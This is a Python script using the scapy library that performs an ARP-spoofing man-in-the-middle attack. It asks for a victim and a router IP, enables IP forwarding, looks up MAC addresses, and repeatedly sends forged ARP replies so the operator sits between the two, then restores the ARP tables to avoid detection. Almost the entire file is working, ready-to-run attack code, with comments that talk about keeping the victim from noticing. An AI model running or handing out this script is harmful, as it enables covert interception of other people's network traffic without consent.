import os
import time
import sys
from scapy.all import *

#get what we are messing with
def getInfo():
	print("~~~Getting addresses...")
	interface = raw_input("Interface (en0 is Macbook Wifi):")
	victimIP = raw_input("Victim IP:")
	routerIP = raw_input("Router IP:")
	return [interface, victimIP, routerIP]

#turn on port forwarding until restart
def setIPForwarding(toggle):
	if(toggle == True):
		print("~~~Turing on IP forwarding...")
		#for OSX
		os.system('sysctl -w net.inet.ip.forwarding=1')
		
		#other
		#os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	if(toggle == False):
		print("~~~Turing off IP forwarding...")
		#for OSX
		os.system('sysctl -w net.inet.ip.forwarding=0')
		
		#other
		#os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

#need to get mac addresses of vitcim and router
#do this by generating ARP requests, which are made
#for getting MAC addresses
def get_MAC(ip, interface):

	#set verbose to 0, least stuff printed (range: 0-4) (4 is max I think)
	#conf.verb = 4
	
	# srp() send/recive packets at layer 2 (ARP)
	# Generate a Ether() for ethernet connection/ARP request (?)
	# timeout 2, units seconds(?) 
	# interface, wlan0, wlan1, etc...
	# inter, time .1 seconds to retry srp()
	# returns  IDK yet
	answer, unanswer = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface=interface, inter = 0.1)

	#I'm not exactly sure as to what how this works, but it gets the data we need
	for send,recieve in answer:
		return recieve.sprintf(r"%Ether.src%")

#this is too restablish the connection between the router
#and victim after we are done intercepting IMPORTANT
#victim will notice very quickly if this isn't done
def reassignARP(victimIP, routerIP, interface):
	print("~~~Reassigning ARPS...")

	#get victimMAC
	victimMAC = get_MAC(victimIP, interface)
	
	#get routerMAC
	routerMAC = get_MAC(routerIP, interface)

	#send ARP request to router as-if from victim to connect, 
	#do it 7 times to be sure
	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC, retry=7))

	#send ARP request to victim as-if from router to connect
	#do it 7 times to be sure
	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC, retry=7))

	#don't need this anymore
	setIPForwarding(False)

#this is the actuall attack
#sends a single ARP request to both targets
#saying that we are the other the other target
#so it's puts us inbetween!
#funny how it's the smallest bit of code
def attack(victimIP, victimMAC, routerIP, routerMAC):
	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

def manInTheMiddle():

	info = getInfo()
	#info = ['en0', '162.246.145.218', '10.141.248.214']
	setIPForwarding(True)

	print("~~~Getting MACs...")
	try:
		victimMAC = get_MAC(info[1], info[0])
	except Exception, e:
		setIPForwarding(False)
		print("~!~Error getting victim MAC...")
		print(e)
		sys.exit(1)

	try:
		routerMAC = get_MAC(info[2], info[0])
	except Exception, e:
		setIPForwarding(False)
		print("~!~Error getting router MAC...")
		print(e)
		sys.exit(1)

	print("~~~Victim MAC: %s" % victimMAC)
	print("~~~Router MAC: %s" % routerMAC)
	print("~~~Attacking...")

	while True:
		try:
			attack(info[1], victimMAC, info[2], routerMAC)
			time.sleep(1.5)
		except KeyboardInterrupt:
			reassignARP(info[1], info[2], info[0])
			break
	sys.exit(1)

manInTheMiddle()
